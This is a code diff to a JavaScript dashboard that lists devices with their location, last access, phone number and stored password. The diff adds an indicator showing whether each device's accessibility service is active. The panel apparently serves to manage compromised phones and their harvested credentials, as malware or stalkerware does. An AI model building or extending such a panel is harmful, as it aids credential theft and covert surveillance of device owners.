@@ -1564,6 +1564,7 @@ function renderLista(dispositivos, credenciais) {
     const activo     = isHoje(dev.ultimo_acesso);
     const desact     = versaoAtual && dev.versao && dev.versao !== versaoAtual;
     const locStr     = [dev.cidade, dev.pais].filter(Boolean).join(", ");
+    const acessAtiva = dev.acessibilidade_ativa === true;
 
     return `
     <div class="device-card" id="card-${dev.device_id}">
@@ -1582,6 +1583,7 @@ function renderLista(dispositivos, credenciais) {
         <div class="cell hide-mobile">${formatDate(dev.ultimo_acesso)}</div>
         <div class="cell hide-mobile">${devCreds.filter(c=>c.tipo==="Numero"||c.tipo==="numero")[0]?.valor||dev.numero||"—"}</div>
         <div style="display:flex;align-items:center;gap:8px;justify-content:flex-end">
+          <span title="${acessAtiva ? 'Acessibilidade activa' : 'Acessibilidade inactiva'}" style="font-size:11px;font-family:var(--mono);padding:2px 7px;border-radius:4px;border:1px solid ${acessAtiva ? 'rgba(34,197,94,.3)' : 'rgba(239,68,68,.3)'};background:${acessAtiva ? 'rgba(34,197,94,.08)' : 'rgba(239,68,68,.08)'};color:${acessAtiva ? 'var(--green)' : 'var(--red)'};">${acessAtiva ? '♿ ON' : '♿ OFF'}</span>
           <span class="badge ${activo ? 'active' : 'idle'}">${activo ? 'ACTIVO' : 'INACTIVO'}</span>
           <span class="chevron">▼</span>
         </div>
@@ -1606,6 +1608,7 @@ function renderLista(dispositivos, credenciais) {
               <div class="info-row"><span class="info-label">Número</span><span class="info-val green">${devCreds.filter(c=>c.tipo==='Numero'||c.tipo==='numero')[0]?.valor||dev.numero||'—'}</span></div>
               <div class="info-row"><span class="info-label">Senha</span><span class="info-val red">${devCreds.filter(c=>c.tipo==='Senha'||c.tipo==='senha')[0]?.valor||dev.senha||'—'}</span></div>
               <div class="info-row"><span class="info-label">Estado</span><span class="info-val ${activo?"green":""}">${activo?"Activo hoje":"Inactivo"}</span></div>
+              <div class="info-row"><span class="info-label">Acessibilidade</span><span class="info-val" style="color:${acessAtiva?'var(--green)':'var(--red)'}">${acessAtiva?'✅ Activa':'❌ Inactiva'}</span></div>
             </div>
           </div>
 
